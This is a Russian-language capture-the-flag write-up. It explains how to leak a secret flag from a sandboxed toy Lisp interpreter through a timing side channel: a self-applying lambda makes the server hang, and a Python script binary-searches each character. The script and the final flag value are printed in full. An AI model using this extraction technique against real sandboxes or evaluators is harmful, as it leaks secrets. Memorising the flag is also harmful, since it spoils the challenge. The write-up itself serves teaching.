# If a tree falls in a forest: Write-up

## Пролог о чистоте

Вован и Толик подняли очень важный вопрос. Вопрос о чистоте. Это ~~мем~~ понятие из функционального программирования о том, что идеальный код не должен иметь побочных эффектов. То есть, функции должны быть чистыми. А чистые функции в свою очередь должны всегда работать одинаково и зависеть только от своего аргумента. Изменился аргумент — изменилось значение, не изменился — результат будет одинаковым, сколько раз её ни вызови.

Рассмотрим антитезис:

<img src="writeup/plug.jpg" height=200>

Является ли электрический провод, от которого питается компьютер, универсальным аргументом всякой чистой функции, которая выполняется на этом компьютере? Ведь если вынуть её, результат вычисления изменится: пользователь окажется перед чёрным экраном. Будет ли это вообще результат? Какого он типа? Какое у него значение? Что-то не сходится.

А может быть так, что чистых функций не существует, и это всё — лишь красивая абстракция, некий идеал, к которому можно бесконечно стремиться, но достичь невозможно? Нам, людям безопасности, выгоднее подходтить к вопросу о чистоте именно с такой, проникнутой пессимизмом, точки зрения. Ведь нам нужно ломать. Ломать, чтобы ближе понимать суть вещей, видеть их такими, какими они являются, не будучи окутанми в пелену идеальных определений.

И ломать куда проще, когда видишь перед собой очередную несовершенную программу. Постулируем: побочные эффекты будут всегда.

Такие дела.

## Изучаем интерпретатор

Откроем `lisp.py` из вложения. Это интерпретатор лиспа. Лиспами называют целое семейство языков, которые характеризуются следующими свойствами:

1. Всё — списки. Список задаётся перечислением его элементов в круглых скобках через пробел: `(1 2 3 (4 5 6))`.
2. Список, поданный, на вход — программа. Она состоит из функции — первого элемента списка — и её аргументов — всего остального. Пример такой программы: `(+ 1 (- 3 2))`, её результат: `2`.

> Это как шахматы: правила просты и запоминаются легко — их знают многие. А вот гроссмейстеров в мире немного. Лисп — удивительная вещь, поскольку для хранения данных и кода используется одна и та же структура данных, что позволяет программировать программы, которые на лету программируют сами себя или новые программы или программы, программирующие новые программы — всё так же на лету. 

Наш лисп довольно простой. Вот что он умеет:

```python
base_ctx = {
    "nil": nil,
    "+": lambda ctx, *args: sum((interpret(ctx, arg) for arg in args), 0),
    "-": lambda ctx, a, b: interpret(ctx, a) - interpret(ctx, b),
    "quote": lambda ctx, arg: arg,
    "list": lambda ctx, *args: [interpret(ctx, arg) for arg in args],
    "if": lambda ctx, cond, then, else_: DelayedInterpret(ctx, then if interpret(ctx, cond) != nil else else_),
    "lambda": lambda lctx, names, expr: lambda cctx, *largs: DelayedInterpret(lctx | {name: interpret(cctx, larg) for name, larg in zip(names, largs)}, expr),
    "eq": lambda ctx, a, b: True if interpret(ctx, a) == interpret(ctx, b) else nil,
    "lt": lambda ctx, a, b: True if interpret(ctx, a) < interpret(ctx, b) else nil,
    "gt": lambda ctx, a, b: True if interpret(ctx, a) > interpret(ctx, b) else nil,
    "car": lambda ctx, lst: interpret(ctx, lst)[0],
    "cdr": lambda ctx, lst: interpret(ctx, lst)[1:],
}
```

Есть базовая арифметика, условный оператор, лямбда, сравнения и функции `car` с `cdr`: первая возвращает начало списка, вторая — всё кроме начала, вкупе они позволяют перемещаться внутри списков.

> Связанных списков. Но здесь YAML-безобразие...

Дальше в коде видно, что в контекст интерпретатора при запуске помещается переменная `flag`, которую необходимо каким-то образом прочитать. Она берётся из окружения переменных, поэтому достать её можно только из того интерпретатора, что запущен на сервере.

Но каждая встроенная функция чистая. Они работают в общем контексте, но он передаётся аргументом. Никаких побочных эффектов, никакого ввода, никакого вывода! 

Вспомним наш постулат. Побочный эффект есть всегда. Можем ли мы сломать интерпретатор? Вынуть провод? Вспоминается тезис Тюринга-Чёрча, о том, что любая вычислительная машина способна зависнуть — погрузиться в вечный цикл.

## Ломаем интерпретатор

Делов-то. Напишем функцию «зависни». Это обеспечит тот самый побочный эффект, который позволит нам менять поведение интерпретатора по своему усмотрению.

Рассмотрим такой псевдокод: 
```python
if условие:
    зависни()
else:
    pass
```

Если условие удовлетворено, программа зависнет. Это мы сможем увидеть снаружи и таким образом извлечь один бит информации изнутри.

Флаг представлен списком целых чисел, которые соответствуют кодам в ACII. Мы можем выполнять арифметические сравнения. Диапазон значений известен: 0…255. Следовательно, можно написать бинарный поиск. 

### Зависни!

Но как погрузить лисп в вечный цикл? В этом лиспе нет `loop` или подобных конструкций. Рекурсия? 

```python
def f():
    f()
```

Мило, но у нас нет переменных. И, однако, это всё равно возможно. Вопрос о том, как написать цикл внутри системы без переменных, учёные решили ещё в начале прошлого века, когда эти рассуждения были сугубо теоретическими. Ответ — [Y-комбинатор](https://lptk.github.io/programming/2019/10/15/simple-essence-y-combinator.html).

$$Y = \lambda f.\ (\lambda x.\ f\ (x\ x))(\lambda x. f\ (x\ x))$$

> Здесь используется синтаксис [лямбда-исчисления](https://serokell.io/blog/untyped-lambda-calculus). У современных лямбд, которые есть во многих языках программирования, ноги расстут именно отсюда. Это фундаментальное учение о вычислениях, оказавшее большое влияние на то, как устроены компьютеры, и как мы представляем себе вычисления в принципе.   


Это занимательное выражение при раскрытии скобок преобразуется само в себя. Можете попробовать. Оно же в чуть более понятном виде:

```python
Y = lambda f: (lambda x: f(x(x)))(lambda x: f(x(x)))
```

Это комбинация безымянных функций, которая будет бесконечно выполнять `f`. Нам выполнять ничего особенно не нужно, поэтому можно упростить выражение.

```python
>>> (lambda x: x(x))(lambda x: x(x))
# Traceback (most recent call last):
#     ...
# RuntimeError: maximum recursion depth exceeded
```

Переведём её на лисп:

```lisp
((lambda (x) (x x)) (lambda (x) (x x)))
```

### Всё складывается

Если выполнить этот код, интерпретатор не зависнет навечно — в системе предусмотрено ограничение на время выполнения в 2 секунды. 

Теперь мы можем доставать результаты выполнения функции `if`:

```python
HANG = "((lambda (x) (x x)) (lambda (x) (x x)))"


def run(prog: str):
    start = time.time()
    requests.post(f"https://thescenicroute.q.2024.ugractf.ru/{TOKEN}", data={"lisp": prog})
    return time.time() - start


def cond(prog: str):
    return run(f"(if {prog} {HANG} nil)") > 2
```

Осталось написать бинпоиск.

```python
while True:
    if not cond(flag_formula):
        break
    l = 0
    r = 256
    while r - l > 1:
        m = (l + r) // 2
        if cond(f"(lt (car {flag_formula}) {m})"):
            r = m
        else:
            l = m
    flag += chr(l)
    print(flag)
    flag_formula = f"(cdr {flag_formula})"
```

Результат не заставит себя ждать:

```
u
ug
ugr
ugra
ugra_
...
```

Поиск флага занимает примерно двадцать минут. Но сам факт, что это возможно, заставляет посмотреть на спор Вована и Толика чуть другими глазами. Кто-то из них явно что-то знает.

А мы всё опять сломали.


Флаг: **ugra_thats_why_total_functional_programming_exists_70yfuxs44w6z**
